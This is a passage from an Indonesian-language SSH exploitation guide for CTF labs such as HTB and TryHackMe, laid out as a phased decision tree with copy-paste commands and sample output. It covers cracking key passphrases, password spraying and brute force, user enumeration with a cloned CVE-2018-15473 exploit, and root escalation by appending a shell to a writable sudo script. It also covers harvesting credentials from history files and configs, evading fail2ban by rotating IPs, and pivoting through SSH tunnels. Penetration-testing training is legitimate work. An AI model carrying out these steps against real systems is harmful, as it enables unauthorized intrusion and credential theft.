* **Output**: `id_rsa:hunter2:id_rsa:...` (Passphrase: `hunter2`).

#### Step 3: Login SSH & Ambil User Flag
```bash
ssh -i id_rsa jordan@$TARGET
# Masukkan passphrase: hunter2
```
```text
jordan@permutation:~$ whoami
jordan
jordan@permutation:~$ cat ~/user.txt
7a9b3c4d5e6f1a2b3c4d5e6f7a8b9c0d
```

---

### 📝 EXAMPLE 2: Username Enum dari Web ➔ Password Spraying ➔ SSH ➔ `sudo -l` Root

**Target**: Linux Box (THM Easy Peasy)

#### Step 1: Username & Password Spraying via NetExec
```bash
# Daftar user yang ditemukan dari author blog web: administrator, dev, sysadmin
nxc ssh $TARGET -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success
```
* **Output**: `[+] dev:dragon (Pwn3d!)`

#### Step 2: Login SSH & Privilege Escalation via Writable Script
```bash
ssh dev@$TARGET
```
```text
dev@easypeasy:~$ sudo -l
User dev may run the following commands on easypeasy:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/backup.py

dev@easypeasy:~$ ls -la /opt/backup.py
-rwxrwxr-x 1 root dev 120 Jan 10 12:00 /opt/backup.py

dev@easypeasy:~$ echo 'import os; os.system("/bin/bash -p")' >> /opt/backup.py
dev@easypeasy:~$ sudo /usr/bin/python3 /opt/backup.py
root@easypeasy:/home/dev# whoami
root
root@easypeasy:/home/dev# cat /root/root.txt
f1e2d3c4b5a6987012345678abcdef01
```

---

### 📝 EXAMPLE 3: Legacy SSH + Port Forwarding ke Database Internal

**Target**: Mesin Linux Legacy (HTB Bastard / Vintage)

#### Step 1: Login Menggunakan Opsi Legacy Cipher
```bash
ssh -i id_rsa \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o KexAlgorithms=+diffie-hellman-group1-sha1 \
  -o HostKeyAlgorithms=+ssh-rsa \
  legacyuser@$TARGET
```

#### Step 2: Identifikasi Service Localhost
```text
legacyuser@vintage:~$ ss -tlnp
LISTEN 0 128 127.0.0.1:3306 0.0.0.0:*
```
* Port MySQL `3306` hanya mendengarkan di `127.0.0.1` (tidak bisa diakses dari luar).

#### Step 3: Setup Local Port Forwarding
```bash
# Di terminal Parrot OS Anda:
ssh -i id_rsa \
  -o KexAlgorithms=+diffie-hellman-group1-sha1 \
  -o HostKeyAlgorithms=+ssh-rsa \
  -L 3307:127.0.0.1:3306 \
  legacyuser@$TARGET -N -f
```

#### Step 4: Akses Database Langsung dari Mesin Lokal
```bash
mysql -h 127.0.0.1 -P 3307 -u root -p'rootpassword' -e "SHOW DATABASES; USE app; SELECT * FROM users;"
```

---

## ⚡ BAGIAN 8: CHEATSHEET SSH (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

```bash
export TARGET="10.10.11.200"
export USER="username"
export PASS="password"
export KEY="id_rsa"
```

```bash
# ==========================================
# 1. PERMISSION & BASIC LOGIN
# ==========================================
chmod 600 $KEY                                           # Set mandatory key permission
ssh -i $KEY $USER@$TARGET                                # Standard key login
ssh -i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $USER@$TARGET # Silent key login
ssh -p 2222 $USER@$TARGET                                # Custom port login

# ==========================================
# 2. LEGACY SSH BYPASS TEMPLATE (ALL-IN-ONE)
# ==========================================
ssh -i $KEY \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 \
  -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
  -o PubkeyAcceptedKeyTypes=+ssh-rsa \
  -c +aes128-cbc,3des-cbc \
  $USER@$TARGET

# ==========================================
# 3. PASSPHRASE CRACKING
# ==========================================
ssh2john $KEY > ${KEY}.hash                              # Extract hash from key
john --wordlist=/usr/share/wordlists/rockyou.txt ${KEY}.hash # Crack hash via CPU
hashcat -m 22931 ${KEY}.hash /usr/share/wordlists/rockyou.txt # Crack hash via GPU

# ==========================================
# 4. CREDENTIAL VALIDATION & SPRAYING
# ==========================================
nxc ssh $TARGET -u users.txt -p passwords.txt --continue-on-success # Spray users & passes
hydra -l $USER -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 4 -f # Online bruteforce

# ==========================================
# 5. POST-CONNECTION TRIAGE (RUN IMMEDIATELY)
# ==========================================
# whoami; id; uname -a; cat /etc/os-release; sudo -l; ss -tlnp; find / -perm -u=s -type f 2>/dev/null

# ==========================================
# 6. PORT FORWARDING & TUNNELING
# ==========================================
ssh -L 8080:127.0.0.1:8080 $USER@$TARGET -N -f          # Local Port Forward (Single Service)
ssh -R 4444:127.0.0.1:4444 $USER@$TARGET -N -f          # Remote Port Forward (Reverse Exposure)
ssh -D 1080 $USER@$TARGET -N -f                          # Dynamic SOCKS5 Proxy (Full Subnet)
```

---

# 06. SSH Exploitation & Tunneling Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah memiliki alur bercabang: **OUTPUT BERHASIL ✅** dan **OUTPUT GAGAL/BERBEDA ❌**. Ikuti tanda panah (`➡️`) sesuai dengan respon terminal yang kamu dapatkan. Jangan skip fase kalibrasi dan fingerprinting awal.

---

## 🔧 PRE-FLIGHT: Setup Environment & Variabel Sesi

Jalankan blok ini di awal sesi terminal Parrot OS / Kali Linux kamu untuk menginisialisasi direktori kerja dan variabel target.

Bash

```
# Inisialisasi variabel target & workspace
export TARGET="10.10.11.200"
export SSH_PORT="22"
export USER=""
export PASS=""
export KEY_FILE="id_rsa"
export LHOST="10.10.14.5"        # IP tun0 VPN kamu
export LPORT="4444"

mkdir -p ~/ssh_loot/{keys,creds,tunnels,hashes}
cd ~/ssh_loot

echo "[*] Target SSH: $TARGET:$SSH_PORT | LHOST: $LHOST"
```

**OUTPUT YANG DIHARAPKAN:**

text

```
[*] Target SSH: 10.10.11.200:22 | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT & RAW BANNER GRABBING

## ═══════════════════════════════════════

### Langkah 0.1 — Raw Banner Grabbing via Netcat

Langkah paling cepat untuk mengekstrak versi OpenSSH dan distribusi OS target tanpa memicu kecurigaan scanner IDS.

Bash

```
nc -vn -w 3 $TARGET $SSH_PORT
```

**OUTPUT BERHASIL ✅ — Banner Ubuntu Focal (Linux):**

text

```
(UNKNOWN) [10.10.11.200] 22 (ssh) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

**Anatomi Pembacaan Banner:**

- `SSH-2.0` : Menjalankan SSH versi 2 (aman dari serangan legacy SSH-1).
- `OpenSSH_8.2p1` : Versi paket OpenSSH Portable.
- `Ubuntu-4ubuntu0.5` : **PENTING!** Versi package base dari Ubuntu 20.04 LTS (Focal Fossa).
- ➡️ **Tindakan:** Catat distro target. Konfigurasi web default server ini biasanya `/var/www/html/` dan Apache di `/etc/apache2/`. Lanjut ke **Langkah 0.2**.

**OUTPUT BERHASIL ✅ — Banner Debian Buster / Bullseye:**

text

```
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
```

- ➡️ **Kesimpulan:** Target Debian 10. Versi OpenSSH < 8.5 rentan terhadap beberapa CVE enumerasi user. Lanjut ke **Langkah 0.2**.

**OUTPUT GAGAL ❌ — Connection Refused:**

text

```
(UNKNOWN) [10.10.11.200] 22 (ssh) : Connection refused
```

➡️ **Penyebab:** Daemon SSH tidak mendengarkan di TCP 22 standar, atau diblokir filter firewall internal.  
➡️ **Solusi:** Jalankan fast sweep ke port alternatif yang umum untuk SSH:

Bash

```
nmap -Pn -sV -p 22,2222,22022,2022,8022 $TARGET
```

Jika port alternatif (misal 2222) terbuka:

Bash

```
export SSH_PORT="2222"
```

**OUTPUT GAGAL ❌ — Connection Timed Out:**

text

```
nc: connect to 10.10.11.200 port 22 (tcp) timed out: Operation now in progress
```

➡️ **Solusi:** Cek kembali link VPN (`ping -c 2 $TARGET`). Jika ICMP mati, periksa apakah ada host discovery firewall: tambahkan flag `-Pn` di semua command Nmap.

---

### Langkah 0.2 — Nmap Detailed Service Fingerprinting

Bash

```
nmap -sV -p $SSH_PORT --script ssh-hostkey $TARGET -oN nmap_ssh_fingerprint.txt
```

**OUTPUT BERHASIL ✅:**

text

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0a:4f:25:e1:17:1c:f8:d2:a0:f2:e3:ba:a3:02:b4:18 (ECDSA)
|_  256 93:f6:da:fc:ab:b6:4f:f1:eb:bc:7e:73:00:b8:81:da (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- ➡️ Lanjut ke **FASE 1**.

---

## ═══════════════════════════════════════

## FASE 1: ENUMERASI METODE AUTENTIKASI & CIPHER

## ═══════════════════════════════════════

> **Tujuan:** Mengetahui secara pasti apakah server menerima password atau **HANYA** mengizinkan public key (`id_rsa`). Langkah ini mencegah pemborosan waktu brute force password pada server yang mematikan fitur password authentication.

### Langkah 1.1 — Deteksi Metode Autentikasi yang Didukung

Bash

```
nmap -p $SSH_PORT --script ssh-auth-methods --script-args="ssh.user=root" $TARGET
```

**OUTPUT BERHASIL ✅ — Password & Public Key Didukung:**

text

```
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
```

- ➡️ **Kesimpulan:** Server menerima login password! Jika punya list user/password, kamu bisa lanjut ke **FASE 6 (Password Spraying)**.

**OUTPUT BERBEDA ⚠️ — Public Key ONLY (Strict Config):**

text

```
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|_    publickey
```

- ➡️ **Kesimpulan:** **JANGAN LAKUKAN BRUTE FORCE PASSWORD!** Server menolak semua password secara eksplisit.
- ➡️ **Tindakan:** Kamu WAJIB mencari private key (`id_rsa` / `id_ed25519`) dari service lain:
    - Check SMB shares ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba))
    - Check Anonymous FTP ([07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp))
    - Check Web Directory Traversal / LFI ([Workflow 24 — LFI / RFI](/docs/lfi-rfi) -> cek `/home/user/.ssh/id_rsa`)
    - Check Web backup file ([16. Directory & Virtual Host (VHost) Fuzzing Workflow — Master Field Guide](/docs/directory-vhost-fuzzing) -> `backup.zip`)

---

### Langkah 1.2 — Enumerasi Algoritma Pertukaran Kunci & Cipher

Sangat penting terutama untuk target CTF lawas (VulnHub, HTB legacy machines) yang sering menggunakan cipher deprecated.

Bash

```
nmap -p $SSH_PORT --script ssh2-enum-algos $TARGET
```

**OUTPUT BERHASIL ✅ — Modern Cipher Suite:**

text

```
| ssh2-enum-algos: 
|   kex_algorithms: (curve25519-sha256, ecdh-sha2-nistp256)
|   server_host_key_algorithms: (rsa-sha2-512, ssh-ed25519)
|   encryption_algorithms: (chacha20-poly1305@openssh.com, aes128-gcm)
```

- ➡️ Sistem modern. Gunakan command koneksi standar di **FASE 2** atau **FASE 3**.

**OUTPUT BERHASIL ✅ — Legacy / Weak Algorithms Terdeteksi (Legacy Flag):**

text

```
| ssh2-enum-algos: 
|   kex_algorithms: (diffie-hellman-group1-sha1)
|   server_host_key_algorithms: (ssh-rsa, ssh-dss)
|   encryption_algorithms: (aes128-cbc, 3des-cbc)
```

- ➡️ **PERINGATAN:** Klien OpenSSH modern di Parrot OS / Kali Linux akan menolak koneksi secara default.
- ➡️ **Tindakan:** Lanjut ke **FASE 4 (Legacy Bypass)** saat menghubungkan SSH.

---

## ═══════════════════════════════════════

## FASE 2: KONEKSI DENGAN PRIVATE KEY (`id_rsa`)

## ═══════════════════════════════════════

> **Masuk sini jika:** Kamu menemukan file private key dari web leak, SMB, NFS, atau FTP.

### Langkah 2.1 — Persiapan Hak Akses Key File

OpenSSH client secara ketat menolak private key yang memiliki permission selain `600` (read/write hanya owner).

Bash

```
# Simpan key yang kamu temukan ke direktori keys
cp /path/to/discovered_key ~/ssh_loot/keys/id_rsa
cd ~/ssh_loot/keys/

# Set permission wajib
chmod 600 id_rsa
ls -la id_rsa
```

**OUTPUT BERHASIL ✅:**

text

```
-rw------- 1 parrot parrot 2602 Jan 15 10:20 id_rsa
```

---

### Langkah 2.2 — Identifikasi Username Pemilik Key

Jika key didapat tanpa informasi username yang jelas:

Bash

```
# Cek baris terakhir public key (jika id_rsa.pub ada)
tail -n 1 id_rsa.pub 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
ssh-rsa AAAAB3NzaC1yc... root@target.htb
```

- ➡️ Username adalah `root`.

Jika file `.pub` tidak tersedia, jalankan string extraction:

Bash

```
strings id_rsa | grep -E -i "user|admin|corp|mail"
```

Jika tidak ada info: gunakan username hasil enumerasi web / OSINT, atau default users: `root`, `admin`, `ubuntu`, `debian`, `svc_ssh`, `user`.

---

### Langkah 2.3 — Eksekusi Koneksi SSH dengan Private Key

Gunakan opsi anti-hang untuk melewati prompt fingerprint dan konflik file `known_hosts`.

Bash

```
ssh -i id_rsa \
    -p $SSH_PORT \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    user@$TARGET
```

**OUTPUT BERHASIL ✅ — Masuk ke Remote Shell:**

text

```
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-131-generic x86_64)
user@target:~$ 
```

- ➡️ **PWNED! FOOTHOLD TERBENTUK!** Langsung lompat ke **FASE 7 (Post-Connection Enumeration)**.

**OUTPUT BERBEDA ⚠️ — Key Terkunci (Passphrase Protected):**

text

```
Enter passphrase for key 'id_rsa':
```

- ➡️ Private key diproteksi oleh passphrase lokal! Jangan tekan sembarang enter.
- ➡️ Tekan `Ctrl+C`. Langsung beralih ke **FASE 5 (SSH Key Passphrase Cracking)**.

**OUTPUT GAGAL ❌ — Permission Denied (Publickey):**

text

```
user@10.10.11.200: Permission denied (publickey).
```

➡️ **Penyebab:**

1. Username `user` salah.
2. Key ini bukan milik user tersebut (tidak ada di file `~/.ssh/authorized_keys` milik target).
3. Public key authentication dinonaktifkan di `/etc/ssh/sshd_config`.  
    ➡️ **Tindakan Troubleshooting (Debug Mode):**

Bash

```
ssh -vvv -i id_rsa -p $SSH_PORT user@$TARGET 2>&1 | grep -E "Offering|Authentications"
```

- Coba username lain dari list user yang kamu punya (`users.txt`):

Bash

```
for u in $(cat ~/ssh_loot/creds/users.txt); do 
    echo "[*] Testing user: $u"
    ssh -i id_rsa -p $SSH_PORT -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes $u@$TARGET "whoami" 2>/dev/null && break
done
```

**OUTPUT GAGAL ❌ — UNPROTECTED PRIVATE KEY FILE:**

text

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
```

➡️ **Solusi:**

Bash

```
chmod 600 id_rsa
```

**OUTPUT GAGAL ❌ — Legacy Negotiation Error:**

text

```
Unable to negotiate with 10.10.11.200 port 22: no matching host key type found. Their offer: ssh-rsa
```

- ➡️ OpenSSH modern menolak RSA lama. Langsung beralih ke **FASE 4 (Legacy SSH Connection Bypass)**.

---

## ═══════════════════════════════════════

## FASE 3: KONEKSI DENGAN PASSWORD

## ═══════════════════════════════════════

> **Masuk sini jika:** Kamu mendapatkan kredensial plaintext dari SMB, konfigurasi database, `.env`, atau cracking hash.

### Langkah 3.1 — Direct SSH Password Login

Bash

```
ssh -p $SSH_PORT \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PubkeyAuthentication=no \
    $USER@$TARGET
```

_(Flag `-o PubkeyAuthentication=no` penting agar SSH client tidak mencoba key lokal kamu dan mencegah trigger lockout)_

**OUTPUT BERHASIL ✅:**

text

```
$USER@10.10.11.200's password: 
Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64
jordan@target:~$
```

- ➡️ **BERHASIL!** Lanjut ke **FASE 7 (Post-Connection Enumeration)**.

**OUTPUT GAGAL ❌ — Permission Denied (Password):**

text

```
jordan@10.10.11.200's password: 
Permission denied, please try again.
```

➡️ **Solusi:**

1. Cek apakah ada typo atau karakter spesial yang terpotong saat ekspor variabel bash.
2. Cek apakah akun terikat ke domain Active Directory (coba format `USER@DOMAIN.LOCAL` atau `DOMAIN\\USER`).
3. Lanjut ke **FASE 6 (Targeted Password Spraying)**.

---

## ═══════════════════════════════════════

## FASE 4: LEGACY SSH CONNECTION BYPASS (CTF CLASSICS)

## ═══════════════════════════════════════

> **Kondisi:** Muncul error negosiasi cipher, key exchange, atau host key saat mencoba terhubung ke mesin Linux lama (OpenSSH 4.x - 6.x).

### Tabel Diagnosa Error Legacy & Parameter Solusi

|Pesan Error Terminal|Penyebab|Solusi Parameter Tambahan|
|---|---|---|
|`no matching key exchange method found. Their offer: diffie-hellman-group1-sha1`|Kex Kuno|`-o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1`|
|`no matching host key type found. Their offer: ssh-rsa,ssh-dss`|Host Key Kuno|`-o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o PubkeyAcceptedKeyTypes=+ssh-rsa`|
|`no matching cipher found. Their offer: aes128-cbc,3des-cbc`|Cipher CBC Kuno|`-c +aes128-cbc,3des-cbc,blowfish-cbc`|

### Langkah 4.1 — Eksekusi Koneksi All-In-One Legacy Bypass

Gunakan template komprehensif ini untuk menembus segala jenis batasan negosiasi kriptografi legacy OpenSSH:

Bash

```
ssh -i id_rsa \
    -p $SSH_PORT \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
    -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -c +aes128-cbc,3des-cbc,blowfish-cbc \
    $USER@$TARGET
```

**OUTPUT BERHASIL ✅:**

text

```
Last login: Sat Dec 12 04:12:01 2015 from 192.168.1.50
[legacyuser@centos6 ~]$ whoami
legacyuser
```

- ➡️ **BERHASIL!** Lanjut ke **FASE 7**.

**OUTPUT GAGAL ❌ — Corrupted MAC on input:**

text

```
Corrupted MAC on input.
ssh_dispatch_run_fatal: Connection to 10.10.11.200 port 22: message authentication code incorrect
```

➡️ **Solusi:** Tambahkan opsi penanganan MAC lawas:

Bash

```
ssh -m +hmac-sha1,hmac-md5 -p $SSH_PORT $USER@$TARGET
```

---

## ═══════════════════════════════════════

## FASE 5: SSH KEY PASSPHRASE CRACKING

## ═══════════════════════════════════════

> **Masuk sini jika:** Private key meminta passphrase saat digunakan di Langkah 2.3.

### Langkah 5.1 — Ekstraksi Hash Menggunakan `ssh2john`

Bash

```
# Ekstrak hash dari file private key
ssh2john ~/ssh_loot/keys/id_rsa > ~/ssh_loot/hashes/id_rsa.hash

head -n 2 ~/ssh_loot/hashes/id_rsa.hash
```

**OUTPUT BERHASIL ✅:**

text

```
id_rsa:$sshng$1$16$16$1024$1$64$6087948382747382$16$21c9fa0e5f...
```

- ➡️ Hash berhasil diekstrak. Lanjut ke **Langkah 5.2**.

**OUTPUT GAGAL ❌ — Error/Tidak ada hash yang diekstrak:**

text

```
id_rsa : no passphrase needed
```

➡️ **Arti:** Key sebenarnya tidak memiliki passphrase. Error sebelumnya kemungkinan terjadi karena format file korup atau key type tidak didukung `ssh2john`.

---

### Langkah 5.2 — Cracking Passphrase via John the Ripper

Bash

```
john --wordlist=/usr/share/wordlists/rockyou.txt ~/ssh_loot/hashes/id_rsa.hash
```

**OUTPUT BERHASIL ✅:**

text

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter2          (id_rsa)     
1g 0:00:00:02 DONE 1/3 (2024-01-15 10:25) 0.4424g/s 452.3p/s 452.3c/s 452.3C/s hunter2..rodrigo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

- ➡️ **Passphrase ditemukan:** `hunter2`

Verifikasi ulang hash:

Bash

```
john --show ~/ssh_loot/hashes/id_rsa.hash
```

**OUTPUT:**

text

```
id_rsa:hunter2:id_rsa:...
1 password hash cracked, 0 left
```

---

### Langkah 5.3 — Alternatif GPU Cracking dengan Hashcat

Jika John terlalu lambat, identifikasi header key untuk memilih Hashcat Mode:

Bash

```
head -n 1 ~/ssh_loot/keys/id_rsa
```

- Jika `-----BEGIN RSA PRIVATE KEY-----` ➡️ Mode **22921** (RSA / PKCS#1 Private Key)
- Jika `-----BEGIN OPENSSH PRIVATE KEY-----` ➡️ Mode **22931** (OpenSSH Private Key bcrypt)

Bash

```
hashcat -m 22931 ~/ssh_loot/hashes/id_rsa.hash /usr/share/wordlists/rockyou.txt -O -w 3
```

---

### Langkah 5.4 — Login Menggunakan Passphrase yang Ter-crack

Bash

```
# Tambahkan key ke ssh-agent agar tidak perlu mengetik password berulang-ulang
eval $(ssh-agent -s)
ssh-add ~/ssh_loot/keys/id_rsa
# Masukkan passphrase: hunter2

# Login langsung
ssh -p $SSH_PORT user@$TARGET
```

- ➡️ **BERHASIL MASUK KE SHELL!** Lanjut ke **FASE 7**.

---

## ═══════════════════════════════════════

## FASE 6: USERNAME ENUMERATION & PASSWORD SPRAYING

## ═══════════════════════════════════════

> ⚠️ **PERINGATAN OPERASIONAL:** OpenSSH pada real network atau lab modern sering kali diproteksi oleh `fail2ban` (IP terblokir otomatis setelah 3–5x percobaan gagal berturut-turut). Lakukan spray hanya jika memiliki wordlist yang terarah.

### Langkah 6.1 — Username Enumeration (CVE-2018-15473)

Bekerja pada OpenSSH versi < 7.7. Server merespon user valid dan user invalid dengan timing paket yang berbeda.

Bash

```
# Clone exploit PoC
git clone https://github.com/Rhynorater/CVE-2018-15473-Exploit /tmp/cve-2018-15473 2>/dev/null

# Jalankan enumerasi dengan userlist ringkas
python3 /tmp/cve-2018-15473/sshUsernameEnumExploit.py \
    --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
    $TARGET > ~/ssh_loot/creds/valid_users.txt

cat ~/ssh_loot/creds/valid_users.txt
```

**OUTPUT BERHASIL ✅:**

text

```
[+] root is a valid user!
[+] dev is a valid user!
[+] jordan is a valid user!
```

- ➡️ **User valid terkonfirmasi:** `root`, `dev`, `jordan`. Simpan ke file untuk spray:

Bash

```
cat << 'EOF' > ~/ssh_loot/creds/target_users.txt
root
dev
jordan
EOF
```

---

### Langkah 6.2 — Multi-User Targeted Spraying via NetExec (nxc)

Bash

```
# Buat password candidate list dari info OSINT / domain name / web technology
cat << 'EOF' > ~/ssh_loot/creds/passwords.txt
Password123!
Welcome2024!
jordan2023!
dragon
target123
admin
EOF

# Jalankan Spraying
nxc ssh $TARGET -p $SSH_PORT -u ~/ssh_loot/creds/target_users.txt -p ~/ssh_loot/creds/passwords.txt --continue-on-success
```

**OUTPUT BERHASIL ✅ — Kredensial Valid Ditemukan:**

text

```
SSH   10.10.11.200   22   10.10.11.200   [-] dev:Password123! Failed authentication
SSH   10.10.11.200   22   10.10.11.200   [+] jordan:dragon (Pwn3d!)
```

- ➡️ **JACKPOT!** User `jordan` dengan password `dragon` valid.
- ➡️ Simpan: `export USER="jordan"; export PASS="dragon"`
- ➡️ Lanjut ke **Langkah 3.1** untuk login.

**OUTPUT GAGAL ❌ — Status Locked Out / Connection Reset:**

text

```
SSH   10.10.11.200   22   10.10.11.200   [!] ssh_exchange_identification: read: Connection reset by peer
```

➡️ **Penyebab:** `fail2ban` terpicu! IP kamu diblokir.  
➡️ **Solusi:**

1. Putuskan dan hubungkan ulang VPN (`tun0`) untuk merotasi IP:

Bash

```
sudo killall openvpn && sudo openvpn ~/lab.ovpn &
```

2. Tunggu lockout timer (biasanya 5–10 menit).
3. Hentikan brute force online, beralih ke attack vector Web/SMB untuk mendapatkan info tambahan.

---

## ═══════════════════════════════════════

## FASE 7: POST-CONNECTION ENUMERATION & QUICK WINS

## ═══════════════════════════════════════

> **Masuk sini segera setelah shell interaktif didapatkan (`user@target:~$`).**

### Langkah 7.1 — Initial Host Triaging

Jalankan perintah ini di dalam shell target secara berurutan:

Bash

```
# 1. Identitas & Sudo Privileges (PRIORITAS NOMOR 1)
whoami && id
sudo -l

# 2. Kernel & OS Architecture
uname -a
cat /etc/os-release

# 3. Akun Pengguna yang Memiliki Shell Aktif
cat /etc/passwd | grep -E -v "nologin|false"

# 4. Antarmuka Jaringan Internal (Cek Kemungkinan Dual-NIC)
ip a || ifconfig

# 5. Service Localhost yang Mendengarkan (Hidden Internal Services)
ss -tlnp || netstat -tlnp
```

**OUTPUT ANALISIS SUDO PRIVILEGE (JACKPOT):**

text

```
Matching Defaults entries for jordan on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jordan may run the following commands on target:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/backup.py
```

- ➡️ Cek izin edit file script tersebut:

Bash

```
ls -la /opt/backup.py
# Jika writable (-rwxrwxr-x jordan):
echo 'import os; os.system("/bin/bash -p")' >> /opt/backup.py
sudo /usr/bin/python3 /opt/backup.py
# ROOT GET!
```

---

### Langkah 7.2 — Pencarian Credential Leak & History

Bash

```
# 1. Cek Bash History dari user aktif dan home direktori lain
cat ~/.bash_history 2>/dev/null
head -n 50 /home/*/.bash_history 2>/dev/null

# 2. Cari SSH Keys milik user lain di mesin
find /home /root -name "id_rsa" -o -name "authorized_keys" -o -name "known_hosts" 2>/dev/null

# 3. Cari password tersimpan di direktori web lokal
grep -riE "password|passwd|db_pass|secret" /var/www/ 2>/dev/null | head -n 30

# 4. Cari binary dengan bit SUID aktif
find / -perm -u=s -type f 2>/dev/null
```

**OUTPUT ANALISIS `ss -tlnp` (PORT INTERNAL TERDETEKSI):**

text

```
State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port  Process
LISTEN   0        128             127.0.0.1:3306           0.0.0.0:*      -
LISTEN   0        128             127.0.0.1:8080           0.0.0.0:*      -
```

- ➡️ **TEMUAN KRITIS:**
    - Port 3306 (MySQL) dan Port 8080 (Web Internal) **hanya** mendengarkan di `127.0.0.1` (localhost). Service ini tidak bisa diakses dari browser Parrot OS kita secara langsung.
- ➡️ **Tindakan:** Wajib melakukan **SSH Tunneling** di **FASE 8**.

---

## ═══════════════════════════════════════

## FASE 8: SSH PORT FORWARDING & TUNNELING

## ═══════════════════════════════════════

### SKENARIO 1: Local Port Forwarding (`-L`) — Mengakses Service Localhost Target

> **Kasus:** Target menjalankan panel web di `127.0.0.1:8080`. Kita ingin membukanya di browser lokal Parrot OS melalui `http://127.0.0.1:9090`.

Jalankan perintah ini di **TERMINAL MESIN PENYERANG (PARROT OS)**:

Bash

```
# Sintaks: ssh -L [PORT_LOKAL]:127.0.0.1:[PORT_TARGET] user@TARGET -N -f
# Opsi -N: Tidak membuka terminal interaktif (hanya tunnel)
# Opsi -f: Berjalan di background

ssh -L 9090:127.0.0.1:8080 \
    -p $SSH_PORT \
    -i ~/ssh_loot/keys/id_rsa \
    $USER@$TARGET -N -f
```

**Verifikasi Tunnel dari Mesin Lokal:**

Bash

```
curl -I http://127.0.0.1:9090/
```

**OUTPUT BERHASIL ✅:**

http

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=4F9A...
Content-Type: text/html;charset=UTF-8
```

- ➡️ **BERHASIL!** Buka browser kamu dan navigasikan ke `http://127.0.0.1:9090`. Kamu sekarang bisa mengaudit aplikasi web internal tersebut.

---

### SKENARIO 2: Dynamic SOCKS5 Proxy (`-D`) & Proxychains — Pivoting Seluruh Subnet

> **Kasus:** Mesin target terhubung ke subnet internal lain (misal `172.16.1.0/24` yang kita ketahui dari perintah `ip a`). Kita ingin menjalankan `nmap`, `curl`, dan browser menembus seluruh jaringan internal tersebut.

**Langkah 1: Buka Dynamic Proxy di Mesin Penyerang:**

Bash

```
ssh -D 1080 \
    -p $SSH_PORT \
    -i ~/ssh_loot/keys/id_rsa \
    $USER@$TARGET -N -f
```

**Langkah 2: Konfigurasi `/etc/proxychains4.conf`:**

Bash

```
# Pastikan baris terakhir konfigurasi proxychains berisi:
# socks5 127.0.0.1 1080
sudo sed -i '/socks4/d' /etc/proxychains4.conf
sudo bash -c "grep -q 'socks5 127.0.0.1 1080' /etc/proxychains4.conf || echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"
tail -n 3 /etc/proxychains4.conf
```

**Langkah 3: Jalankan Scanning Melalui Proxychains:**

Bash

```
# Pindai IP internal 172.16.1.10
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.10
```

**OUTPUT BERHASIL ✅:**

text

```
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:445  ...  OK
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

- ➡️ **PIVOTING BERHASIL!** Kamu sekarang dapat menyerang service internal dengan tool lokal via wrapper `proxychains <command>`.

---

